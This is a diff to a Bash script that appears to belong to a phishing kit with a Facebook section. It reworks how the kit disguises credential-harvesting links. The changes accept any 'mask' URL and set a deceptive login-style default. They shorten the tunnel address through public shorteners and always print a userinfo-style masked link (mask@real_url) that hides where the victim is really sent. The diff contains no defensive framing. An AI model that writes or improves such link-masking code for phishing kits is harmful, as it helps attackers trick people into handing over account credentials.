@@ -460,13 +460,12 @@ custom_mask() {
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
-		if [[ ${mask_url} =~ ^https?://[a-zA-Z0-9.-]+ ]]; then
-			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
-		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
-		fi
+		read -e -p "${WHITE} ==> ${ORANGE}" mask_url
+		[[ -z "$mask_url" ]] && mask_url="https://connexion-systeme-gestion" # Default
+		# Clean up double https:// if user pasted over it
+		mask_url=$(echo "$mask_url" | sed 's|^https://https://|https://|')
+		mask=$mask_url
+		echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
 	fi
 }
 
@@ -474,7 +473,7 @@ custom_mask() {
 site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
 
 shorten() {
-	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 --max-time 5 "$1$2")
 	if [[ "$1" == *"shrtco.de"* ]]; then
 		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
 	else
@@ -489,33 +488,31 @@ custom_url() {
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
-	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
-			shorten $isgd "$url"
-		elif [[ $(site_stat $shortcode) == 2* ]]; then
-			shorten $shortcode "$url"
-		else
-			shorten $tinyurl "$url"
-		fi
-
-		url="https://$url"
-		if [[ $processed_url != "" ]]; then
-			masked_url="$mask@$processed_url"
-			processed_url="https://$processed_url"
-		else
-			processed_url="Unable to Short URL"
-			masked_url="Unable to generate masked link"
-		fi
+	{ custom_mask; banner_small; }
+	
+	raw_url="$url"
+	url="https://$raw_url"
+	
+	# Try shortening
+	if [[ $(site_stat $isgd) == 2* ]]; then
+		shorten $isgd "$raw_url"
+	elif [[ $(site_stat $shortcode) == 2* ]]; then
+		shorten $shortcode "$raw_url"
 	else
-		# echo "[!] No url provided / Regex Not Matched"
-		url="Unable to generate links. Try after turning on hotspot"
+		shorten $tinyurl "$raw_url"
+	fi
+
+	if [[ -n "$processed_url" ]]; then
+		masked_url="$mask@$processed_url"
+		processed_url="https://$processed_url"
+	else
 		processed_url="Unable to Short URL"
+		masked_url="$mask@$raw_url"
 	fi
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
